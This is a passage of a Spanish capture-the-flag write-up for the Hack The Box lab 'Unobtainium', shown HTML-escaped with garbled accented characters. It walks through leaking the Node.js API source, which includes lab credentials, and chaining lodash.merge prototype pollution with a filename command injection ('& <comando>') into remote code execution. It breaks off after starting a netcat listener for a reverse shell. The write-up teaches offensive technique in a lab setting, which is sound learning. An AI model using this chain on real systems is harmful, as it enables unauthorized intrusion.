&lt;p&gt;Despu√©s de mandar algunos mensajes (‚Äúhola‚Äù, ‚Äútest‚Äù y ‚Äúesto‚Äù) y estar visitando esa &lt;strong&gt;URL&lt;/strong&gt; vemos que por cada petici√≥n var√≠a lo que se muestra, no siempre tenemos el mismo output aunque no cambiemos nada en la petici√≥n, hagamos un bucle de 10 peticiones para que se entienda lo que digo:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;(Cada vez que subimos un mensaje nos tiene que responder &lt;code&gt;Message has been sent!&lt;/code&gt;, si no, no se esta subiendo el mensaje)&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± for i in $(seq 1 10); do echo -n &quot;$i &amp;gt;&amp;gt; &quot;; curl -k -s http://unobtainium.htb:31337; echo; sleep 1; done
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;1 &amp;gt;&amp;gt; [{&quot;icon&quot;:&quot;__&quot;,&quot;text&quot;:&quot;hola&quot;,&quot;id&quot;:1,&quot;timestamp&quot;:1625093446861,&quot;userName&quot;:&quot;felamos&quot;},{&quot;icon&quot;:&quot;__&quot;,&quot;text&quot;:&quot;test&quot;,&quot;id&quot;:2,&quot;timestamp&quot;:1625093587859,&quot;userName&quot;:&quot;felamos&quot;}]
2 &amp;gt;&amp;gt; [{&quot;icon&quot;:&quot;__&quot;,&quot;text&quot;:&quot;hola&quot;,&quot;id&quot;:1,&quot;timestamp&quot;:1625093446861,&quot;userName&quot;:&quot;felamos&quot;},{&quot;icon&quot;:&quot;__&quot;,&quot;text&quot;:&quot;test&quot;,&quot;id&quot;:2,&quot;timestamp&quot;:1625093587859,&quot;userName&quot;:&quot;felamos&quot;}]
3 &amp;gt;&amp;gt; [{&quot;icon&quot;:&quot;__&quot;,&quot;text&quot;:&quot;esto&quot;,&quot;id&quot;:1,&quot;timestamp&quot;:1625093741331,&quot;userName&quot;:&quot;felamos&quot;}]
4 &amp;gt;&amp;gt; [{&quot;icon&quot;:&quot;__&quot;,&quot;text&quot;:&quot;hola&quot;,&quot;id&quot;:1,&quot;timestamp&quot;:1625093446861,&quot;userName&quot;:&quot;felamos&quot;},{&quot;icon&quot;:&quot;__&quot;,&quot;text&quot;:&quot;test&quot;,&quot;id&quot;:2,&quot;timestamp&quot;:1625093587859,&quot;userName&quot;:&quot;felamos&quot;}]
5 &amp;gt;&amp;gt; [{&quot;icon&quot;:&quot;__&quot;,&quot;text&quot;:&quot;esto&quot;,&quot;id&quot;:1,&quot;timestamp&quot;:1625093741331,&quot;userName&quot;:&quot;felamos&quot;}]
6 &amp;gt;&amp;gt; [{&quot;icon&quot;:&quot;__&quot;,&quot;text&quot;:&quot;esto&quot;,&quot;id&quot;:1,&quot;timestamp&quot;:1625093741331,&quot;userName&quot;:&quot;felamos&quot;}]
7 &amp;gt;&amp;gt; []
8 &amp;gt;&amp;gt; [{&quot;icon&quot;:&quot;__&quot;,&quot;text&quot;:&quot;hola&quot;,&quot;id&quot;:1,&quot;timestamp&quot;:1625093446861,&quot;userName&quot;:&quot;felamos&quot;},{&quot;icon&quot;:&quot;__&quot;,&quot;text&quot;:&quot;test&quot;,&quot;id&quot;:2,&quot;timestamp&quot;:1625093587859,&quot;userName&quot;:&quot;felamos&quot;}]
9 &amp;gt;&amp;gt; []
10 &amp;gt;&amp;gt; [{&quot;icon&quot;:&quot;__&quot;,&quot;text&quot;:&quot;esto&quot;,&quot;id&quot;:1,&quot;timestamp&quot;:1625093741331,&quot;userName&quot;:&quot;felamos&quot;}]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Todas son creadas por &lt;strong&gt;felamos&lt;/strong&gt; (tambi√©n lo vimos en el archivo &lt;code&gt;app.js&lt;/code&gt;). No s√© el porqu√© a veces no muestra o muestra cualquier mensaje‚Ä¶ Pero bueno, los vemos reflejados en el puerto &lt;strong&gt;31337&lt;/strong&gt;, o sea, esa es la API de la que se habla en el √≠tem 2 del &lt;strong&gt;todo&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Adem√°s tenemos el formato con el que son guardadas, vemos un campo &lt;code&gt;icon&lt;/code&gt; (que no me imagino para que pueda ser) y los dem√°s que si tienen sentido.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;explotacion&quot;&gt;Explotaci√≥n &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Jugando con &lt;strong&gt;BurpSuite&lt;/strong&gt; y con las variables de entorno en &lt;strong&gt;Linux&lt;/strong&gt; logramos interceptar la petici√≥n al enviar un mensaje:&lt;/p&gt;

&lt;p&gt;Validamos el puerto por el que escucha el proxy de &lt;strong&gt;Burp&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_check_port.png&quot; alt=&quot;338burp_check_port&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seteamos una variable de &lt;strong&gt;Linux&lt;/strong&gt; que toma el proxy:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± export http_proxy=http://127.0.0.1:8080/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ponemos a &lt;strong&gt;Burp&lt;/strong&gt; en escucha y enviamos un mensaje:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB_burp.png&quot; alt=&quot;338bash_exec_unobtainiumDEB_burp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y en &lt;strong&gt;Burp&lt;/strong&gt; recibimos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_message_burp.png&quot; alt=&quot;338burp_unobtainium_message_burp&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;(Si nos les funciona a la primera, cierren el programa, pongan el proxy en escucha y vuelvanlo a abrir. O pueda que hayan declarado la variable en una terminal distinta de la que usan para ejecutar el binario :O)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Vemos como viaja la petici√≥n, tenemos la versi√≥n de &lt;strong&gt;Electron&lt;/strong&gt; y de nuevo las credenciales üôÉ&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;No logramos hacer nada al intentar injectar cositas con el mensaje :(&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;found-indexjs&quot;&gt;Encontramos el c√≥digo fuente de la API &lt;a href=&quot;#found-indexjs&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;D√°ndole algunas vuelticas al binario y sus peticiones me llamo la atenci√≥n lo que hace cuando vemos la lista de tareas, o sea, &lt;code&gt;Todo&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo.png&quot; alt=&quot;338burp_unobtainium_todo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que la lista la obtiene de un archivo llamado &lt;code&gt;todo.txt&lt;/code&gt; :o Esto nos da ideas de intentar leer otros archivos, intentando e intentando no encontramos ning√∫n archivo üòî, pero encontramos un error al probar algunas cadenas o incluso dejando el campo vac√≠o üòÑ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo_error.png&quot; alt=&quot;338burp_unobtainium_todo_error&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y si, no encuentra X archivo por lo tanto no sabe que hacer y devuelve un error (lo que esta mal es que se muestre el error as√≠ como as√≠ :P).&lt;/p&gt;

&lt;p&gt;Vemos unas rutas:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;/usr/src/app/index.js
/usr/src/app/node_modules/express/lib/router/route.js
/usr/src/app/node_modules/express/lib/router/layer.js
/usr/src/app/node_modules/express/lib/router/index.js
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ver esas rutas me dio la idea de buscar en el sistema los archivos relacionados con &lt;strong&gt;unobtainium&lt;/strong&gt; a ver si hab√≠a alguno llamado &lt;code&gt;todo.txt&lt;/code&gt; y as√≠ tener una idea de donde esta tom√°ndolo el servidor web (pero nelson, no encontramos)&lt;/p&gt;

&lt;p&gt;(Pruebas, pruebas y pruebas) Apoyados en nuestra ‚Äúabrizhion del paquete‚Äù vemos que el archivo &lt;code&gt;/usr/src/app/index.js&lt;/code&gt; tambi√©n lo tenemos y esta junto al objeto &lt;code&gt;package.json&lt;/code&gt; (que ya vimos antes).&lt;/p&gt;

&lt;p&gt;Pues enviando tanto el archivo &lt;code&gt;index.js&lt;/code&gt; como &lt;code&gt;package.json&lt;/code&gt; en el campo &lt;code&gt;filename&lt;/code&gt; logramos obtener respuesta (:&lt;/p&gt;

&lt;p&gt;üî¶ &lt;strong&gt;&lt;u&gt;package.json&lt;/u&gt;&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo_packageJSON.png&quot; alt=&quot;338burp_unobtainium_todo_packageJSON&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tomamos el contenido y lo guardamos en un archivo, para pasarlo a un formato m√°s lindo podemos hacer esto:&lt;/p&gt;

&lt;p&gt;Remplazamos el texto &lt;code&gt;\n&lt;/code&gt; por un salto de l√≠nea real y quitamos los escapes que hay en las comillas:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± sed -i 's/\\n/\n/g' todo_package.json 
‚ù± sed -i 's/\\&quot;/&quot;/g' todo_package.json 
‚ù± cat todo_package.json 
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{
  &quot;name&quot;: &quot;Unobtainium-Server&quot;,
  &quot;version&quot;: &quot;1.0.0&quot;,
  &quot;description&quot;: &quot;API Service for Electron client&quot;,
  &quot;main&quot;: &quot;index.js&quot;,
  &quot;scripts&quot;: {
    &quot;start&quot;: &quot;node index.js&quot;
  },
  &quot;author&quot;: &quot;felamos&quot;,
  &quot;license&quot;: &quot;ISC&quot;,
  &quot;dependencies&quot;: {
    &quot;body-parser&quot;: &quot;1.18.3&quot;,
    &quot;express&quot;: &quot;4.16.4&quot;,
    &quot;lodash&quot;: &quot;4.17.4&quot;,
    &quot;google-cloudstorage-commands&quot;: &quot;0.0.1&quot;
  },
  &quot;devDependencies&quot;: {}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Opa, es la descripci√≥n del app, vemos las dependencias (librer√≠as que usa) y sus versiones, me gusta.&lt;/p&gt;

&lt;p&gt;D√°ndole un formato lindo al archivo &lt;code&gt;index.js&lt;/code&gt; obtenemos el c√≥digo base de la aplicaci√≥n :o&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± sed -i 's/\\n/\n/g' todo_index.js 
‚ù± sed -i 's/\\t/  /g' todo_index.js 
‚ù± sed -i 's/\\&quot;/&quot;/g' todo_index.js 
‚ù± cat todo_index.js
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Agregue unos comentarios para que sea un poco m√°s entendible cada parte.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var root = require(&quot;google-cloudstorage-commands&quot;);
const express = require('express');
const { exec } = require(&quot;child_process&quot;);
const bodyParser = require('body-parser');
const _ = require('lodash');
const app = express();
var fs = require('fs');

const users = [
  {name: 'felamos', password: 'Winter2021'},
  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},
];

let messages = [];
let lastId = 1;

function findUser(auth) {
  return users.find((u) =&amp;gt;
    u.name === auth.name &amp;amp;&amp;amp;
    u.password === auth.password);
}

app.use(bodyParser.json());

// Validamos el mensaje que creamos (M√©todo GET)
app.get('/', (req, res) =&amp;gt; {
  res.send(messages);
});

// Sube el mensaje (M√©todo PUT)
app.put('/', (req, res) =&amp;gt; {
  const user = findUser(req.body.auth || {});

  if (!user) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  const message = {
    icon: '__',
  };

  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });

  messages.push(message);
  res.send({ok: true});
});

// Borra el mensaje (M√©todo DELETE)
app.delete('/', (req, res) =&amp;gt; {
  const user = findUser(req.body.auth || {});

  if (!user || !user.canDelete) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  messages = messages.filter((m) =&amp;gt; m.id !== req.body.messageId);
  res.send({ok: true});
});

// Al parecer sube un archivo (M√©todo POST)
app.post('/upload', (req, res) =&amp;gt; {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  filename = req.body.filename;
  root.upload(&quot;./&quot;,filename, true);
  res.send({ok: true, Uploaded_File: filename});
});

// Extrae la info de un archivo y la muestra (M√©todo POST)
app.post('/todo', (req, res) =&amp;gt; {
  const user = findUser(req.body.auth || {});
  if (!user) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  filename = req.body.filename;
        testFolder = &quot;/usr/src/app&quot;;
        fs.readdirSync(testFolder).forEach(file =&amp;gt; {
                if (file.indexOf(filename) &amp;gt; -1) {
                        var buffer = fs.readFileSync(filename).toString();
                        res.send({ok: true, content: buffer});
                }
        });
});

app.listen(3000);
console.log('Listening on port 3000...');
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfecto, perfectisimoooooooooooooooooooooooo, varias cositas para ver‚Ä¶&lt;/p&gt;

&lt;p&gt;Vemos los usuarios encargados de hacer las peticiones, a &lt;strong&gt;admin&lt;/strong&gt; es la primera vez que lo vemos, pero poco podemos hacer con √©l, ya que su contrase√±a es random :(&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;&lt;u&gt;admin&lt;/u&gt;&lt;/strong&gt; tiene dos items que &lt;strong&gt;&lt;u&gt;felamos&lt;/u&gt;&lt;/strong&gt; no tiene, &lt;code&gt;canDelete&lt;/code&gt; y &lt;code&gt;canUpdate&lt;/code&gt;, los dos est√°n en &lt;strong&gt;&lt;u&gt;true&lt;/u&gt;&lt;/strong&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Esto toma sentido si miramos la funci√≥n que sube un archivo:&lt;/p&gt;

&lt;p&gt;üî¶ &lt;strong&gt;&lt;u&gt;/upload&lt;/u&gt;&lt;/strong&gt; - &lt;strong&gt;¬øuser.canUpload?&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;app.post('/upload', (req, res) =&amp;gt; {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  filename = req.body.filename;
  root.upload(&quot;./&quot;,filename, true);
  res.send({ok: true, Uploaded_File: filename});
});
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;V√°lida si el usuario que esta haciendo la petici√≥n trae consigo el √≠tem &lt;code&gt;canUpload&lt;/code&gt; encendido, si s√≠, toma el valor de &lt;code&gt;filename&lt;/code&gt; y lo sube al servidor a la ruta en la que est√© el archivo &lt;code&gt;index.js&lt;/code&gt;, o sea, si logramos subir un archivo podr√≠amos ver su contenido con el feature &lt;code&gt;Todo&lt;/code&gt; (:&lt;/p&gt;

&lt;p&gt;Perfectoowowow, pues podr√≠amos intentar jugar con ese objeto y el usuario &lt;strong&gt;felamos&lt;/strong&gt; a ver si logramos subir o crear un archivo:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Si hacemos peticiones hacia el recurso &lt;code&gt;/upload&lt;/code&gt; sin el objeto&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_withoutCanUP.png&quot; alt=&quot;338burp_unobtainium_upload_withoutCanUP&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Claramente no nos deja, ahora intentemos con el objeto &lt;code&gt;&quot;canUpload&quot;:true&lt;/code&gt;:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_withCanUP_fail.png&quot; alt=&quot;338burp_unobtainium_upload_withCanUP_fail&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero tampoco nos deja :(&lt;/p&gt;

&lt;p&gt;Probando y probando no logramos subir nada‚Ä¶ Leyendo lo que hace la funci√≥n &lt;code&gt;/upload&lt;/code&gt; vemos que para el tr√°mite usa una -funci√≥n- de una de las librer√≠as:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var root = require(&quot;google-cloudstorage-commands&quot;);
...
...
  root.upload(&quot;./&quot;,filename, true);
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Buscando info sobre ella (estaba buscando su uso, pero de los primeros resultados hab√≠a uno que hablaba de vulnerabilidades :o) encontramos que es una librer√≠a deprecada yyyy que tiene una vulnerabilidad:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_googleCloudStorage_commandInj.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Opa, curiosamente es el mismo formato que tenemos nosotros en el script. La vulnerabilidad es sencilla, una inyecci√≥n de comandos por culpa de una mala sanitizaci√≥n (:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431&quot;&gt;Command Injection - &lt;strong&gt;google-cloudstorage-commands&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;La cosa es que este bug no nos permitir√° &lt;u&gt;subir un archivo&lt;/u&gt;, ya que no le indicara al servicio que nos active el objeto &lt;code&gt;canUpload&lt;/code&gt;. Pero esta interesante tenerlo por si conseguimos asignarnos el objeto.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Con la idea de mirar las librer√≠as nos situamos ahora en &lt;a href=&quot;https://lodash.com/&quot;&gt;lodash&lt;/a&gt;, que es usada en la creaci√≥n del mensaje:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;const _ = require('lodash');
...
...
  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ah√≠ est√°n los campos que vimos al hacer las 10 peticiones con el &lt;strong&gt;for&lt;/strong&gt; y el mensaje es manipulado con &lt;code&gt;req.body.message&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Algo que vemos es el uso de la funci√≥n &lt;a href=&quot;https://lodash.com/docs/4.17.15#merge&quot;&gt;merge()&lt;/a&gt;, que b√°sicamente juega con tres objetos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;(1) &lt;code&gt;message&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;(2) &lt;code&gt;req.body.message&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;(3) &lt;code&gt;id - timestamp - username&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Y los usa para tomar las propiedades de los objetos &lt;code&gt;2&lt;/code&gt; y &lt;code&gt;3&lt;/code&gt; yyyyy hered√°rselos al objeto &lt;code&gt;1&lt;/code&gt;, as√≠ de sencillo.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://masteringjs.io/tutorials/lodash/merge&quot;&gt;Este es un ejemplo&lt;/a&gt; que encontr√©:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_mergeFunc_example.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y esta ser√≠a una simulaci√≥n de lo que pasa al crear el mensaje y como la variable &lt;code&gt;message&lt;/code&gt; hereda el valor del mensaje que enviamos junto a los dem√°s objetos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_mergeFunc_simulationMessage.png&quot; alt=&quot;338google_mergeFunc_simulationMessage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Perfecto, sabemos como se genera toooda la trama que vemos al crear un mensaje (:&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;prototype-pollution&quot;&gt;Prototype Pollution en &lt;u&gt;lodash.merge&lt;/u&gt; para asignar &lt;u&gt;canUpdate&lt;/u&gt; al usuario &lt;u&gt;felamos&lt;/u&gt; &lt;a href=&quot;#prototype-pollution&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;La cosa es que buscando info sobre &lt;strong&gt;merge()&lt;/strong&gt; y si existen vulnerabilidades para ella nos damos cuenta de que s√≠, existen cositas para jugar‚Ä¶&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://snyk.io/vuln/SNYK-JS-LODASHMERGE-173732&quot;&gt;Prototype Pollution -  &lt;strong&gt;lodash.merge&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;La &lt;a href=&quot;https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications&quot;&gt;contaminaci√≥n de prototipos&lt;/a&gt; se basa en la inyecci√≥n de propiedades dentro de -prototipos- existentes en JS, como pueden ser los &lt;strong&gt;objetos&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Cuando un objeto es creado va a contener propiedades y m√©todos necesarios de un prototipo (ya que JS esta basado en prototipos), esos prototipos contienen atributos ‚Äúm√°gicos‚Äù o ‚Äúesenciales‚Äù tales como &lt;code&gt;_proto_&lt;/code&gt;, &lt;code&gt;constructor&lt;/code&gt; y &lt;code&gt;prototype&lt;/code&gt;. Lo que pasa es que &lt;strong&gt;JS&lt;/strong&gt; permite que esos atributos sean alterados, esto (por culpa de &lt;strong&gt;merge()&lt;/strong&gt;) le da la mano al atacante (a nosotros) de sobreescribir o contaminar objetos de la aplicaci√≥n ü§Ø&lt;/p&gt;

&lt;p&gt;Nos guiaremos de este recurso para probar la contaminaci√≥n:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/kimmobrunfeldt/lodash-merge-pollution-example&quot;&gt;Demonstration of &lt;strong&gt;_.merge&lt;/strong&gt; pollution vulnerability&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Lo que hace es subir un archivo que contiene el atributo -m√°gico- &lt;code&gt;_proto_&lt;/code&gt; con el objeto que quiere contaminar, o sea, cambiar.&lt;/p&gt;

&lt;p&gt;Sube &lt;code&gt;attack.json&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_pollution_attackJSON.png&quot; alt=&quot;338google_pollution_attackJSON&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Muy sencillo, al usuario &lt;code&gt;john.doe@mail.com&lt;/code&gt; le asigna el objeto &lt;code&gt;admin&lt;/code&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Nosotros podr√≠amos probar a asignar &lt;code&gt;canUpdate&lt;/code&gt; al usuario &lt;strong&gt;felamos&lt;/strong&gt; usando el mismo atributo e intentar &lt;strong&gt;subir (&lt;code&gt;/upload&lt;/code&gt;)&lt;/strong&gt; alg√∫n archivo üëÄ:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_pollution_withCanUP_fail.png&quot; alt=&quot;338burp_unobtainium_upload_pollution_withCanUP_fail&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero no, espero que alguno sepa ya el porqu√©‚Ä¶ :P&lt;/p&gt;

&lt;p&gt;B√°sicamente es porque la funci√≥n vulnerable (&lt;code&gt;merge()&lt;/code&gt;) esta en la creaci√≥n del mensaje y no en la subida del archivo, entonces primero debemos contaminar el objeto para luego ah√≠ si probar si se nos asign√≥ el poder de subir archivos (:&lt;/p&gt;

&lt;p&gt;Creamos mensaje maligno :P&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_message_pollution_withCanUP.png&quot; alt=&quot;338burp_unobtainium_message_pollution_withCanUP&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora intentamos subir un archivoooooooooooooooooooooooooooooo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_pollution_withCanUP_fail.png&quot; alt=&quot;338burp_unobtainium_upload_pollution_withCanUP_done&quot; /&gt;&lt;/p&gt;

&lt;p&gt;PERFECTOOOOOOOOOO, podemos subir archivoooooooooooslsssssssslakdjflasdflasjdfl (:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_gif_letsgodrake.gif&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 60%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Intentando ver el archivo (que no tiene contenido :P) el servidor se muere e.e&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo_pollution_holaTXT.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Peeeero tooodos tranquilos, recordemos nuestra vulnerabilidad con &lt;code&gt;google-cloudstorage-commands&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;prototype-pollution-rce&quot;&gt;RCE = Prototype Pollution (&lt;u&gt;lodash.merge&lt;/u&gt;) + Command Injection (&lt;u&gt;google-cloudstorage&lt;/u&gt;) &lt;a href=&quot;#prototype-pollution-rce&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ya podemos crear archivos, tenemos la posibilidad de pasarle el nombre del archivo, veamos como era la inyecci√≥n de comandos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_googleCloudStorage_commandInjCut.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Simplemente debemos colocar:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&amp;amp; &amp;lt;comando_que_queremos_ejecutar&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Va a tomar un nombre vac√≠o y despu√©s ejecutar√≠a el comando, a√∫n no hemos comprobado que funcione, pero pa eso estamos, ¬øno? a veeeeeeeeer:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_pollution_idINholaTXT.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo que queremos es que tome el resultado del comando &lt;code&gt;id&lt;/code&gt; y lo guarde en el archivo &lt;code&gt;hola.txt&lt;/code&gt;, as√≠ validamos su contenido con &lt;strong&gt;Todo&lt;/strong&gt;, el archivo se cre√≥, por lo que esperamos que se haya ejecutado el comando, validemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo_pollution_idINholaTXT.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yyyyyyyy s√≠, &lt;strong&gt;tenemos ejecuci√≥n remota de comandosssssss&lt;/strong&gt;, que bestialidad esooooooooo, me encantoooooooooooooooo‚Ä¶&lt;/p&gt;

&lt;p&gt;Pues aprovechemonos de esto para entablarnos una Reverse Shell.&lt;/p&gt;

&lt;p&gt;Nos ponemos en escucha:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nc -lvp 4433
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ejecutamos:&lt;/p&gt;

